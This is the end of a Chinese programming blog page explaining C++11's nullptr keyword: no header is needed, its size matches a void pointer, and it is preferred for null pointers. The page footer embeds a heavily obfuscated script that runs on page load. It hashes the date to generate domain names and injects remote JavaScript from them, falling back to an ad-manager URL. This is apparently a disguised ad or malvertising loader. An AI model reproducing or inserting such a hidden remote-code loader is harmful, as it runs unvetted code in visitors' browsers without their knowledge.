<p>对于 <strong>C++98</strong> 存在的问题，<strong>C++11</strong> 引入了关键字 <strong>nullptr</strong>。</p> 
<p><strong>但是，还得注意：</strong></p> 
<blockquote> 
 <p>1）在使用 <strong>nullptr</strong> 表示指针空值时，不需要包含头文件，因为 <strong>nullptr</strong> 是 <strong>C++11</strong> 作为新关键字引入的。<br>  <br> 2）在 <strong>C++11</strong> 中，<code>sizeof(nullptr)</code> 与 <code>sizeof((void*)0)</code> 所占的字节数相同。<br>  <br> 3）为了提高代码的健壮性，在后续表示指针空值时建议最好使用 <strong>nullptr</strong>。</p> 
</blockquote>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>